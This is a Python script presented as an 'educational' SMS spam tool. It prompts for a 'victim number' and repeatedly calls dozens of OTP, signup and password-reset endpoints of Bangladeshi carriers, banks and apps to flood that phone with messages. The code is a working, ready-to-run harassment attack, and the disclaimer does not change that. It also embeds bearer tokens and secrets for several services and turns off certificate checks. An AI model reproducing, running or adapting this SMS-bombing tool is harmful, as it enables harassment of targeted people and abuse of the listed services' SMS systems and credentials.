#!/usr/bin/python3
"""
===============================================
    LC CYBER ZONE SMS Spam Tool - Educational Edition
    Released By : @LC_CYBER_ZONE
    Version : 7.0 (Redesigned)
    Purpose : Educational & Cyber Awareness Only
===============================================
"""

import os
import sys
import time
import json
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich import print as rprint
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from datetime import datetime
import urllib3

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Rich console
console = Console()

# Color scheme
class Colors:
    PRIMARY = "cyan"
    SECONDARY = "yellow"
    SUCCESS = "green"
    ERROR = "red"
    WARNING = "yellow"
    INFO = "blue"
    HIGHLIGHT = "magenta"

# User Agents
USER_AGENTS = {
    "chrome_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "android": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36",
    "iphone": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15"
}

class LCCYBERZONE:
    def __init__(self):
        self.console = Console()
        self.version = "7.0"
        self.total_apis = 60
        self.success_count = 0
        self.fail_count = 0
        
    def display_banner(self):
        """Display modern ASCII banner"""
        banner = """
╔══════════════════════╗
║ ██╗░░░░░░█████╗░    ║
║ ██║░░░░░██╔══██╗    ║
║ ██║░░░░░██║░░╚═╝    ║
║ ██║░░░░░██║░░██╗    ║
║ ███████╗╚█████╔╝    ║
║ ╚══════╝░╚════╝░    ║
║                      ║
║       LC CYBER       ║
╚══════════════════════╝

        """
        self.console.print(f"[bold {Colors.PRIMARY}]{banner}[/bold {Colors.PRIMARY}]")
        
    def show_disclaimer(self):
        """Display disclaimer panel"""
        disclaimer = Panel(
            "[bold red]⚠ WARNING[/bold red]\n\n"
            "• This tool is for [bold]EDUCATIONAL PURPOSE[/bold] only\n"
            "• Do not use for illegal activities\n"
            "• The developer is not responsible for misuse\n"
            "• Always respect others' privacy\n"
            "• Check your local laws before use",
            title="[bold yellow]Disclaimer[/bold yellow]",
            border_style="red",
            width=80
        )
        self.console.print(disclaimer)
        self.console.print()
        
    def get_victim_info(self):
        """Get and validate victim number and amount"""
        table = Table(show_header=False, box=None)
        table.add_column("Field", style=f"bold {Colors.PRIMARY}")
        table.add_column("Value", style=f"bold {Colors.SECONDARY}")
        
        while True:
            self.console.print(f"\n[bold {Colors.PRIMARY}]╭─[/bold {Colors.PRIMARY}] [bold]Enter Victim Number[/bold]")
            number = self.console.input(f"[bold {Colors.PRIMARY}]╰─[/bold {Colors.PRIMARY}] $ ")
            
            if number.isdigit() and len(number) == 11:
                break
            else:
                self.console.print(f"[bold {Colors.ERROR}]✗ Invalid number! Must be 11 digits[/bold {Colors.ERROR}]")
                
        while True:
            try:
                self.console.print(f"\n[bold {Colors.PRIMARY}]╭─[/bold {Colors.PRIMARY}] [bold]Enter Spam Amount[/bold]")
                amount = int(self.console.input(f"[bold {Colors.PRIMARY}]╰─[/bold {Colors.PRIMARY}] $ "))
                if amount > 0:
                    break
                else:
                    self.console.print(f"[bold {Colors.ERROR}]✗ Amount must be positive![/bold {Colors.ERROR}]")
            except ValueError:
                self.console.print(f"[bold {Colors.ERROR}]✗ Please enter a valid number![/bold {Colors.ERROR}]")
                
        return number, amount
        
    def make_request(self, func_name, request_func, number, progress, task):
        """Make API request with progress tracking"""
        try:
            request_func(number)
            self.success_count += 1
            progress.update(task, advance=1, description=f"[green]✓ {func_name}[/green]")
        except Exception:
            self.fail_count += 1
            progress.update(task, advance=1, description=f"[red]✗ {func_name}[/red]")
            
    def run_spam_cycle(self, number, cycle):
        """Run one complete spam cycle"""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
            transient=True
        ) as progress:
            
            # Define all API functions
            apis = [
                ("PaperFly", self.api_paperfly),
                ("Ghoori", self.api_ghoori),
                ("Doctime", self.api_doctime),
                ("Sundarban", self.api_sundarban),
                ("Apex4U", self.api_apex4u),
                ("Robi", self.api_robi),
                ("Banglalink", self.api_banglalink),
                ("Banglalink OTP", self.api_banglalink_otp),
                ("Grameenphone", self.api_grameenphone),
                ("Robi Offer", self.api_robi_offer),
                ("Robi DA", self.api_robi_da),
                ("Robi Chat", self.api_robi_chat),
                ("Redx", self.api_redx),
                ("Fundesh", self.api_fundesh),
                ("Bikroy", self.api_bikroy),
                ("MotionView", self.api_motionview),
                ("Chorki", self.api_chorki),
                ("Jatri", self.api_jatri),
                ("ChinaOnline", self.api_chinaonline),
                ("Deepto", self.api_deepto),
                ("Shikho", self.api_shikho),
                ("Redx Signup", self.api_redx_signup),
                ("Bioscope", self.api_bioscope),
                ("Binge", self.api_binge),
                ("AppLink", self.api_applink),
                ("Chokrojan", self.api_chokrojan),
                ("Dhaka Bank", self.api_dhakabank),
                ("Easy", self.api_easy),
                ("Eshop", self.api_eshop),
                ("FSIBL", self.api_fsibl),
                ("MyGP", self.api_mygp),
                ("GP Shop", self.api_gp_shop),
                ("Hishabee", self.api_hishabee),
                ("Iqra", self.api_iqra),
                ("Robi Smart", self.api_robi_smart),
                ("MCB", self.api_mcb),
                ("Mithai", self.api_mithai),
                ("EnglishMoja", self.api_englishmoja),
                ("MoveOn", self.api_moveon),
                ("OshudPotro", self.api_oshudpotro),
                ("MyGP Login", self.api_mygp_login),
                ("Qcoom", self.api_qcoom),
                ("Circle", self.api_circle),
                ("Shomvob", self.api_shomvob),
                ("ToyBox", self.api_toybox),
                ("Win2Gain", self.api_win2gain),
                ("Kepler", self.api_kepler),
                ("Roots Edu", self.api_roots_edu),
                ("Roots Forget", self.api_roots_forget),
            ]
            
            # Create tasks for each API
            for i, (name, func) in enumerate(apis[:self.total_apis]):
                task = progress.add_task(f"[cyan]{name}", total=1)
                self.make_request(name, func, number, progress, task)
                
        # Show cycle summary
        self.console.print(f"[bold {Colors.PRIMARY}]Cycle {cycle} Complete | "
                          f"[green]✓ Success: {self.success_count}[/green] | "
                          f"[red]✗ Failed: {self.fail_count}[/red][/bold {Colors.PRIMARY}]")
        
    def start_attack(self, number, amount):
        """Start the spam attack"""
        self.console.clear()
        self.display_banner()
        
        # Display target info
        info_panel = Panel(
            f"[bold {Colors.SECONDARY}]Target:[/bold {Colors.SECONDARY}] [bold]+88{number}[/bold]\n"
            f"[bold {Colors.SECONDARY}]Cycles:[/bold {Colors.SECONDARY}] [bold]{amount}[/bold]\n"
            f"[bold {Colors.SECONDARY}]APIs per cycle:[/bold {Colors.SECONDARY}] [bold]{self.total_apis}[/bold]\n"
            f"[bold {Colors.SECONDARY}]Total SMS:[/bold {Colors.SECONDARY}] [bold]{amount * self.total_apis}[/bold]",
            title="[bold green]Attack Configuration[/bold green]",
            border_style="green",
            width=80
        )
        self.console.print(info_panel)
        self.console.print()
        
        # Start attack
        start_time = time.time()
        
        for cycle in range(1, amount + 1):
            self.console.rule(f"[bold yellow]Cycle {cycle}/{amount}[/bold yellow]")
            self.success_count = 0
            self.fail_count = 0
            self.run_spam_cycle(number, cycle)
            
            if cycle < amount:
                self.console.print(f"[bold {Colors.INFO}]Waiting 3 seconds before next cycle...[/bold {Colors.INFO}]")
                time.sleep(3)
                
        # Show final summary
        elapsed_time = time.time() - start_time
        summary_panel = Panel(
            f"[bold]Total Cycles:[/bold] {amount}\n"
            f"[bold]APIs per Cycle:[/bold] {self.total_apis}\n"
            f"[bold]Total Attempts:[/bold] {amount * self.total_apis}\n"
            f"[bold]Time Elapsed:[/bold] {elapsed_time:.2f} seconds\n"
            f"[bold green]Status:[/bold green] [green]Completed Successfully[/green]",
            title="[bold green]Final Summary[/bold green]",
            border_style="green",
            width=80
        )
        self.console.print()
        self.console.print(summary_panel)
        self.console.print(f"\n[bold {Colors.PRIMARY}]Thank you for using LC CYBER ZONE SMS Spam v{self.version}[/bold {Colors.PRIMARY}]")
        
    # API Functions
    def api_paperfly(self, number):
        headers = {'accept': 'application/json', 'content-type': 'application/json'}
        json_data = {'full_name': 'Test User', 'company_name': 'Test Co', 
                    'email_address': 'test@email.com', 'phone_number': number}
        requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_ghoori(self, number):
        headers = {'accept': 'application/json', 'content-type': 'application/json'}
        json_data = {'mobile_no': number}
        requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_doctime(self, number):
        headers = {'accept': 'application/json', 'content-type': 'application/json'}
        json_data = {'data': {'country_calling_code': '88', 'contact_no': number}}
        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_sundarban(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'operationName': 'CreateAccessToken', 
                    'variables': {'accessTokenFilter': {'userName': number}},
                    'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter } } }'}
        requests.post('https://api-gateway.sundarbancourierltd.com/graphql', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_apex4u(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phoneNumber': number}
        requests.post('https://api.apex4u.com/api/auth/login', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_robi(self, number):
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc', 
                  'Content-Type': 'application/json'}
        data = {'phone_number': number, 'type': 'doorstep'}
        requests.post('https://webapi.robi.com.bd/v1/send-otp', json=data, headers=headers, timeout=5)
    
    def api_banglalink(self, number):
        requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, timeout=5)
    
    def api_banglalink_otp(self, number):
        headers = {'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ'}
        json_data = {'mobile': number}
        requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data, timeout=5)
    
    def api_grameenphone(self, number):
        data = {'msisdn': number}
        requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', data=data, timeout=5)
    
    def api_robi_offer(self, number):
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'}
        json_data = {'phone_number': number, 'type': 'my_offer'}
        requests.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data, timeout=5)
    
    def api_robi_da(self, number):
        data = {'msisdn': number}
        requests.post('https://da-api.robi.com.bd/da-nll/otp/send', json=data, timeout=5)
    
    def api_robi_chat(self, number):
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'}
        json_data = {'phone_number': number, 'name': 'Test User', 'type': 'video-chat'}
        requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers=headers, json=json_data, timeout=5)
    
    def api_redx(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phoneNumber': number}
        requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_fundesh(self, number):
        headers = {'content-type': 'application/json; charset=UTF-8'}
        json_data = {'msisdn': number}
        requests.post('https://fundesh.com.bd/api/auth/generateOTP', headers=headers, json=json_data, timeout=5)
    
    def api_bikroy(self, number):
        requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', 
                    params={'phone': number}, timeout=5)
    
    def api_motionview(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phone': number}
        requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_chorki(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'number': '+88'+number}
        requests.post('https://api-dynamic.chorki.com/v2/auth/login', 
                     params={'country': 'BD', 'platform': 'web'}, 
                     headers=headers, json=json_data, timeout=5)
    
    def api_jatri(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phone': '+88'+number, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}
        requests.post('https://user-api.jslglobal.co:444/v2/send-otp', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_chinaonline(self, number):
        requests.get('https://chinaonlinebd.com/api/login/getOtp', params={'phone': number}, timeout=5)
    
    def api_deepto(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'number': '+88'+number}
        requests.post('https://api.deeptoplay.com/v2/auth/login', 
                     params={'country': 'BD', 'platform': 'web'}, 
                     headers=headers, json=json_data, timeout=5)
    
    def api_shikho(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phone': number, 'type': 'student', 'auth_type': 'signup', 'vendor': 'shikho'}
        requests.post('https://api.shikho.com/auth/v2/send/sms', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_redx_signup(self, number):
        headers = {'content-type': 'application/json'}
        data = '{"name":"Test User","phoneNumber":"'+number+'","service":"redx"}'
        requests.post('https://api.redx.com.bd/v1/user/signup', headers=headers, data=data, timeout=5)
    
    def api_bioscope(self, number):
        requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp', timeout=5)
    
    def api_binge(self, number):
        requests.post('https://ss.binge.buzz/otp/send/login'+number, timeout=5)
    
    def api_applink(self, number):
        headers = {'content-type': 'application/json'}
        data = {'msisdn': '88'+number}
        requests.post('https://applink.com.bd/appstore-v4-server/login/otp/request', 
                     headers=headers, json=data, verify=False, timeout=5)
    
    def api_chokrojan(self, number):
        headers = {'content-type': 'application/json', 'domain-name': 'chokrojan.com', 'user-platform': '3'}
        data = {'mobile_number': number}
        requests.post('https://chokrojan.com/api/v1/passenger/login/mobile', 
                     headers=headers, json=data, timeout=5)
    
    def api_dhakabank(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobileNo': number, 'product_id': '250', 'requestChannel': 'MOB', 'trackingStatus': 5}
        requests.post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber', 
                     headers=headers, json=data, verify=False, timeout=5)
    
    def api_easy(self, number):
        headers = {'content-type': 'application/json'}
        data = {'name': 'Test User', 'email': 'test@email.com', 'mobile': number, 
                'password': 'pass123', 'password_confirmation': 'pass123', 'device_key': 'test123'}
        requests.post('https://core.easy.com.bd/api/v1/registration', 
                     headers=headers, json=data, timeout=5)
    
    def api_eshop(self, number):
        headers = {'content-type': 'application/json'}
        data = {'type': 'phone', 'phone': number}
        requests.post('https://eshop-api.banglalink.net/api/v1/customer/send-otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_fsibl(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobileNo': number, 'product_id': '122', 'requestChannel': 'MOB', 'trackingStatus': 5}
        requests.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber', 
                     headers=headers, json=data, timeout=5)
    
    def api_mygp(self, number):
        headers = {'content-type': 'application/json'}
        data = {'accessinfo': {'access_token': 'K165S6V6q4C6G7H0y9C4f5W7t5YeC6', 'referenceCode': '20190827042622'}}
        requests.post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D', 
                     headers=headers, json=data, timeout=5)
    
    def api_gp_shop(self, number):
        headers = {'content-type': 'application/json'}
        data = {'phone': number, 'email': '', 'language': 'en'}
        requests.post('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_hishabee(self, number):
        requests.post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={number}', timeout=5)
    
    def api_iqra(self, number):
        requests.get(f'http://apibeta.iqra-live.com/api/v1/sent-otp/{number}', verify=False, timeout=5)
    
    def api_robi_smart(self, number):
        number = number.lstrip('0')
        data = {'cli': number}
        requests.post('https://smart1216.robi.com.bd/robi_sivr/public/login/phone', 
                     json=data, timeout=5)
    
    def api_mcb(self, number):
        data = {'PhoneNumber': number}
        requests.post('https://www.mcbaffiliate.com/Affiliate/RequestOTP', 
                     data=data, timeout=5)
    
    def api_mithai(self, number):
        headers = {'Authorization': 'Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ=='}
        data = {'phone': number, 'email': f'test{number}@gmail.com', 'password1': 'Pass123@', 
                'password2': 'Pass123@', 'company_id': '2', 'storefront_id': '5'}
        requests.post('https://mithaibd.com/api/login/', headers=headers, json=data, timeout=5)
    
    def api_englishmoja(self, number):
        data = {'phone': '+88'+number}
        requests.post('https://api.englishmojabd.com/api/v1/auth/login', 
                     json=data, timeout=5)
    
    def api_moveon(self, number):
        headers = {'content-type': 'application/json'}
        data = {'phone': number}
        requests.post('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_oshudpotro(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobile': '+88-'+number, 'deviceToken': 'app', 'language': 'bn', 'os': 'android'}
        requests.post('https://api.osudpotro.com/api/v1/users/send_otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_mygp_login(self, number):
        requests.get(f'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en', timeout=5)
    
    def api_qcoom(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobileNumber': '+88'+number}
        requests.post('https://auth.qcoom.com/api/v1/otp/send', 
                     headers=headers, json=data, timeout=5)
    
    def api_circle(self, number):
        headers = {'content-type': 'application/json'}
        data = {'name': '+88'+number, 'email_or_phone': '+88'+number, 
                'password': 'pass123', 'password_confirmation': 'pass123', 'register_by': 'phone'}
        requests.post('https://reseller.circle.com.bd/api/v2/auth/signup', 
                     headers=headers, json=data, timeout=5)
    
    def api_shomvob(self, number):
        headers = {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s'}
        data = {'phone': number}
        requests.post('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 
                     headers=headers, json=data, timeout=5)
    
    def api_toybox(self, number):
        data = {'Operation': 'CreateSubscription', 'MobileNumber': '88'+number, 
                'PackageID': 100, 'Secret': 'HJKX71%UHYH'}
        requests.post('https://api.toybox.live/bdapps_handler.php', 
                     json=data, timeout=5)
    
    def api_win2gain(self, number):
        headers = {'sourcePlatform': 'web', 'client': '2'}
        requests.get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{number}', 
                    headers=headers, timeout=5)
    
    def api_kepler(self, number):
        data = {'deviceId': 'test123', 'deviceInfo': {'deviceInfoSignature': 'test', 'deviceId': 'test123'},
                'operator': 'Gp', 'walletNumber': number}
        requests.post('https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', 
                     json=data, timeout=5)
    
    def api_roots_edu(self, number):
        data = {'name': 'Test User', 'phone': f'88{number}', 'email': f'test{number}@email.com', 
                'password': 'pass123', 'confirmPassword': 'pass123'}
        requests.post('https://rootsedulive.com/api/auth/register', 
                     data=data, timeout=5)
    
    def api_roots_forget(self, number):
        data = {'phoneOrEmail': f'88{number}'}
        requests.post('https://rootsedulive.com/api/auth/forget-password', 
                     data=data, timeout=5)

def main():
    """Main function"""
    try:
        # Check and install required packages
        required_packages = ['rich', 'requests']
        for package in required_packages:
            try:
                __import__(package)
            except ImportError:
                console.print(f"[yellow]Installing {package}...[/yellow]")
                os.system(f"pip install {package}")
        
        # Create tool instance
        tool = LCCYBERZONE()
        
        # Clear screen
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Display banner and disclaimer
        tool.display_banner()
        tool.show_disclaimer()
        
        # Get victim info
        number, amount = tool.get_victim_info()
        
        # Start attack
        tool.start_attack(number, amount)
        
    except KeyboardInterrupt:
        console.print(f"\n[bold {Colors.WARNING}]⚠ Tool stopped by user[/bold {Colors.WARNING}]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[bold {Colors.ERROR}]⚠ Error: {str(e)}[/bold {Colors.ERROR}]")
        sys.exit(1)

if __name__ == "__main__":
    main()